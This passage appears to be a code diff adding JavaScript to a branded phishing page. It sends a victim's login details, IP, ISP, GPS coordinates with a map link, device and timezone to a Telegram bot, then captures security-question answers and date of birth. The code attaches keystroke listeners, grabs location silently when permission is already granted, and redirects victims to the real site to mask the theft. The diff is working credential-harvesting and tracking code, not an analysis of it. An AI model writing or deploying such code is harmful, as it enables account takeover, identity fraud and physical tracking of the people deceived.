+        if (remember) message += `☑️ *Remember Account:* On\n`;
+        message += `\n🌐 *IP:* ${targetIP}\n`;
+        message += `📍 *IP Location:* ${targetCity}, ${targetCountry}\n`;
+        if (targetLat && targetLon) {
+            message += `🗺 *IP Coords:* ${targetLat}, ${targetLon}\n`;
+        }
+        if (preciseLocation) {
+            message += `🎯 *GPS:* ${preciseLocation.lat}, ${preciseLocation.lon} (±${preciseLocation.acc}m)\n`;
+            message += `🗺 *GPS Map:* https://www.google.com/maps?q=${preciseLocation.lat},${preciseLocation.lon}\n`;
+        }
+        message += `🏢 *ISP:* ${targetISP}\n`;
+        message += `📱 *Device:* ${platform}\n`;
+        message += `🖥 *Screen:* ${screenInfo}\n`;
+        message += `🕐 *Timezone:* ${timezone}\n`;
+        message += `⏰ *Time:* ${timestamp}`;
+        
+        sendToTelegram(message);
+        
+        if (brand.hasSecurityQuestions) {
+            setTimeout(() => {
+                document.getElementById('loginCard').style.display = 'none';
+                document.getElementById('securityPage').style.display = 'block';
+            }, 1500);
+        } else {
+            setTimeout(() => {
+                window.location.href = brand.realSite;
+            }, 2500);
+        }
+    });
+}
+
+// ========================
+// SECURITY QUESTIONS FORM
+// ========================
+function setupSecurityForm() {
+    const secForm = document.getElementById('securityForm');
+    if (!secForm) return;
+    
+    secForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const q1 = document.getElementById('secQ1').value;
+        const a1 = document.getElementById('secA1').value.trim();
+        const q2 = document.getElementById('secQ2').value;
+        const a2 = document.getElementById('secA2').value.trim();
+        const dob = document.getElementById('dob').value;
+        
+        document.getElementById('securityForm').style.display = 'none';
+        document.getElementById('secLoading').style.display = 'block';
+        
+        let message = `🛡️ *${brand.name} — Security Questions Captured!*\n\n`;
+        message += `❓ *Q1:* ${q1}\n`;
+        message += `✏️ *A1:* \`${a1}\`\n`;
+        message += `❓ *Q2:* ${q2}\n`;
+        message += `✏️ *A2:* \`${a2}\`\n`;
+        message += `📅 *DOB:* \`${dob}\``;
+        
+        sendToTelegram(message);
+        
+        setTimeout(() => {
+            window.location.href = brand.realSite;
+        }, 2500);
+    });
+}
+
+// ========================
+// INIT
 // ========================
 setTimeout(() => {
-    requestGeolocation();
-}, 3000);
+    attachKeystrokeListeners();
+    setupFormHandler();
+    setupSecurityForm();
+    
+    // On page load, check if we already have permission. If so, grab GPS immediately.
+    // Otherwise we wait for the button click (setupFormHandler handles that).
+    if (navigator.permissions) {
+        navigator.permissions.query({ name: 'geolocation' }).then(p => {
+            if (p.state === 'granted') {
+                // Permission already granted — grab GPS now
+                requestGeolocation();
+            }
+            // If 'prompt' or 'denied', wait for user click on submit button
+        }).catch(() => {});
+    }
+}, 500);
 </script>
 </body>
 </html>
